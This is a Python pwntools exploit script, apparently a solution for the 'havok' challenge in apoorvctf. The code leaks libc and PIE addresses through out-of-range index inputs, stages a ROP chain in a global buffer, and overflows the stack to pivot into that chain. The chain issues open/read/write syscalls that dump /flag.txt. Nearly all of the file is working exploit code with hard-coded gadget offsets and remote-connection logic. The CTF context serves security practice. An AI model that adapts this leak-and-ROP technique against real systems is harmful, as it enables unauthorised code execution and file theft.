#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./havok')
libc = ELF('./libc.so.6')

REMOTE = args.REMOTE
HOST = args.HOST or 'chals1.apoorvctf.xyz'
PORT = int(args.PORT or 5001)

def conn():
    if REMOTE:
        return remote(HOST, PORT)
    return process(['./ld-linux-x86-64.so.2', '--library-path', '.', './havok'])

def has_syscall_bytes(data):
    for i in range(len(data) - 1):
        if data[i] == 0x0f and data[i+1] == 0x05:
            return True
    return False

for attempt in range(10):
    elf = ELF('./havok', checksec=False)
    libc = ELF('./libc.so.6', checksec=False)
    io = conn()

    # ─── RING 1: Leak libc and PIE ───
    io.recvuntil(b'3):')
    time.sleep(0.1)
    io.sendline(b'65534')
    io.recvuntil(b'energy: ')
    puts_leak = int(io.recvline().strip(), 16)
    libc.address = puts_leak - libc.sym['puts']
    log.info(f'[{attempt}] libc: {hex(libc.address)}')
    io.recvuntil(b'reading:\n')
    time.sleep(0.1)
    io.sendline(b'AAAA')

    io.recvuntil(b'3):')
    time.sleep(0.1)
    io.sendline(b'65535')
    io.recvuntil(b'energy: ')
    main_leak = int(io.recvline().strip(), 16)
    elf.address = main_leak - elf.sym['main']
    log.info(f'[{attempt}] pie: {hex(elf.address)}')
    io.recvuntil(b'reading:\n')
    time.sleep(0.1)
    io.sendline(b'BBBB')

    # Wait for LOG output to confirm label was processed
    io.recvuntil(b'[LOG]')
    io.recvline()

    # ─── Gadgets ───
    leave_ret = elf.address + 0x1224
    ret = elf.address + 0x101a
    plasma_sig_addr = elf.address + 0x4060

    pop_rdi = libc.address + 0x10269a
    pop_rsi = libc.address + 0x053887
    pop_rdx_xor_eax = libc.address + 0x0d6ffd
    pop_rax = libc.address + 0x0d47d7
    syscall_ret = libc.address + 0x93916
    xchg_rdi_rax = libc.address + 0x181fe1  # xchg rdi, rax; cld; ret

    flag_path = plasma_sig_addr + 0xe0

    # ─── Build ROP chain ───
    # rop[0] = fake RBP (consumed by leave)
    # rop[1..] = actual ROP chain
    rop = p64(0)  # fake RBP

    # open("/flag.txt", 0) → rax = fd
    rop += p64(pop_rdi) + p64(flag_path) + p64(pop_rsi) + p64(0)
    rop += p64(pop_rax) + p64(2) + p64(syscall_ret)

    # read(fd, buf, 0x80) — xchg moves open's rax (fd) into rdi
    rop += p64(xchg_rdi_rax)  # rdi = fd from open
    rop += p64(pop_rsi) + p64(plasma_sig_addr + 0x100)
    rop += p64(pop_rdx_xor_eax) + p64(0x80) + p64(syscall_ret)  # eax=0=SYS_read

    # write(1, buf, 0x80)
    rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(plasma_sig_addr + 0x100)
    rop += p64(pop_rdx_xor_eax) + p64(0x80) + p64(pop_rax) + p64(1) + p64(syscall_ret)

    payload = rop.ljust(0xe0, b'\x00')
    payload += b'/flag.txt\x00'
    payload = payload.ljust(0x100, b'\x00')

    if has_syscall_bytes(payload):
        log.warning(f'[{attempt}] Payload has 0x0f 0x05, retrying...')
        io.close()
        continue

    # ─── RING 3: Send plasma signature ───
    io.recvuntil(b'256 bytes):\n')
    time.sleep(0.2)
    io.send(payload)

    # Wait for confirmation
    io.recvuntil(b'Buffered in cosmic memory.')

    # ─── RING 4: Stack overflow ───
    io.recvuntil(b'Confirm injection key:\n')
    time.sleep(0.5)

    overflow = b'\x00' * 0x20 + p64(plasma_sig_addr) + p64(leave_ret)
    io.send(overflow)

    time.sleep(3)
    try:
        data = io.recvall(timeout=8)
    except:
        data = io.recv(timeout=5)

    output = data.decode(errors='replace')
    log.info(f'Received {len(data)} bytes')
    if 'apoorvctf{' in output:
        import re
        flag = re.search(r'apoorvctf\{[^}]+\}', output)
        if flag:
            log.success(f'FLAG: {flag.group()}')
            with open('flag.txt', 'w') as f:
                f.write(flag.group() + '\n')
        break

    print(repr(output[:200]))
    io.close()

    if not REMOTE:
        break
